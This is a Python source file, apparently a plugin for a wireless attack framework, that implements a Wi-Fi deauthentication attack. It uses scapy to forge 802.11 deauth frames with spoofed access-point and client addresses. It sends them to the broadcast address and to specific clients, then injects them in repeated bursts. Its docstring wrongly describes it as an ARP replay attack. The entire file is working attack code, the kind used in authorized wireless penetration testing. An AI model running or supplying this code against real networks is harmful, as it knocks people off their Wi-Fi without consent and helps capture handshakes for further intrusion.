# -*- coding: utf-8 -*-
"""
This plugin will launch a full arp replay attack on a WEP network
"""

from AuxiliaryModules.events import UnsuccessfulEvent, NeutralEvent
from SessionManager.sessionmanager import SessionManager
from plugin import AirInjectorPlugin
from scapy.all import Dot11, Dot11Deauth, RadioTap
from textwrap import dedent
from socket import error as socket_error


class Deauthenticator(AirInjectorPlugin):

    def __init__(self):
        super(Deauthenticator, self).__init__("deauthenticator")
        try:
            self._burst_count   = int(self.config["burst_count"])
            self._targeted_only = self.config["targeted_only"].lower() == "true"
        except:
            self._burst_count   = 5
            self._targeted_only = False

    def _find_bssid(self, ssid, ap_targets):
        for ap in ap_targets:
            if ap.ssid == ssid:
                return ap.bssid
        return None

    def interpret_targets(self, ap_targets, client_targets):
        # Packet creation based on:
        # https://raidersec.blogspot.pt/2013/01/wireless-deauth-attack-using-aireplay.html
        if not self._targeted_only:
            for access_point in ap_targets:
                deauth_packet = RadioTap() / \
                                Dot11(type=0, subtype=12,    addr1="FF:FF:FF:FF:FF:FF",
                                                            addr2=access_point.bssid,
                                                            addr3=access_point.bssid) / \
                                Dot11Deauth(reason=7)

                self.packets.add(deauth_packet)
                SessionManager().log_event(NeutralEvent("Added AP with BSSID '{}' as deauthentication target."
                                                        .format(access_point.bssid)))

        for client in client_targets:
            mac = client.client_mac
            bssid = client.associated_bssid

            if bssid is None:
                continue

            deauth_packet1 =    RadioTap() / \
                                Dot11(type=0, subtype=12, addr1=bssid, addr2=mac, addr3=mac) / \
                                Dot11Deauth(reason=7)
            deauth_packet2 =    RadioTap() / \
                                Dot11(type=0, subtype=12, addr1=mac, addr2=bssid, addr3=bssid) / \
                                Dot11Deauth(reason=7)

            self.packets.add(deauth_packet1)
            self.packets.add(deauth_packet2)
            SessionManager().log_event(NeutralEvent("Added Client with MAC '{}' as deauthentication target."
                                                    .format(mac)))

    def inject_packets(self):
        count = self._burst_count if self._burst_count > 0 else 5

        print dedent("[+] Starting deauthentication attack \n\
                    - {nburst} bursts of 1 packets \n\
                    - {npackets} different packets").format( nburst=self._burst_count,
                                                             npackets=len(self.packets))
        SessionManager().log_event(NeutralEvent("Staring Deuthentication Attack"))
        try:
            while count >= 0 and not self.should_stop:
                for packet in self.packets:
                    self.injection_socket.send(packet)

                count -= 1
        except socket_error as e:
            if not e.errno == 100:
                print e
        except Exception as e:
            print "Exception: {}".format(e)
            print "[-] Stopped deauthentication attack because of error."
            SessionManager().log_event(UnsuccessfulEvent("Deauthentication attack crashed with error: {}"
                                                        .format(str(e))))
